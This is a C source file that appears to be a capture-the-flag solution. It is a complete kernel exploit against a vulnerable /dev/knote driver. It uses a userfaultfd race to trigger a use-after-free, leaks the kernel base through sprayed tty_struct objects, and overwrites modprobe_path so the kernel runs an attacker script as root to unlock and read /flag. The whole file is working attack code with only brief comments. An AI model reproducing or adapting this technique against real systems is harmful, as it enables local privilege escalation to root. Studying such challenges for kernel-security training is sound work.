#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

#include "userfaultfd_tool.h"
#include "note.h"

int main(int argc, char **args, char **envp)
{
    int fd, ptmx_fd, i, file_fd, pid, result;
    parameter param;
    char buf[0x1000], *handle_page, *new_args[] = {"/tmp/wrong_elf", NULL};
    size_t kernel_base, *ptr, modprobe_path;

    fd = open("/dev/knote", O_RDONLY);
    ASSERT((fd == -1), 0, "open error!");
    
    handle_page = get_userfault_page(2);
    ptr = (size_t *)handle_page;

    add_chunk(fd, 0x3f0); // 0

    RUN_JOB(get_chunk, fd, 0, handle_page);

    delete_chunk(fd, 0);

    /* Fill the chunk that just freed with tty_struct */
    for(i = 0; i < 16; i++)
    {
        ASSERT((open("/dev/ptmx", O_RDWR) == -1), 0, "open error!");
    }

    /* Release lock, then it can get the memory of tty_struct. */
    release_fault_page();

    kernel_base = ptr[74] - 0x5d3b70;
    LOGV(kernel_base);

    modprobe_path = kernel_base + REAL_OFFSET(0xffffffff8245c5c0);
    LOGV(modprobe_path);

    add_chunk(fd, 0x3f0);

    ptr = (size_t *)PAGE_COPY_ADDR;
    ptr[0] = modprobe_path;
    RUN_JOB(edit_chunk, fd, 0, handle_page + 0x1000);

    delete_chunk(fd, 0);
    release_fault_page();

    add_chunk(fd, 0x3f0);
    // get modprobe_path
    add_chunk(fd, 0x3f0);

    file_fd = open("/tmp/shell.sh", O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK, 0755);
    ASSERT((file_fd == -1), 0, "open error!");
    write(file_fd,  "#!/bin/sh\n"
                    "chmod 777 flag\n"
                    "sleep 20\n", 34);
    close(file_fd);

    edit_chunk(fd, 1, "/tmp/shell.sh");

    file_fd = open(new_args[0], O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK, 0755);
    ASSERT((file_fd == -1), 0, "open error!");
    write(file_fd,  "\x00", 1);
    close(file_fd);
    
    pid = fork();
    ASSERT((pid != -1), 1, "fork error!");

    if(pid)
    {
        puts("wait ...");
        sleep(1);
        file_fd = open("/flag", O_RDONLY);
        ASSERT((file_fd == -1), 0, "open error!");
        result = read(file_fd, buf, sizeof(buf) - 1);
        buf[result] = 0;
        puts(buf);
    }
    else
    {
        ASSERT(execve(new_args[0], new_args, envp), 0, "execve error!");
    }

    return  0;
}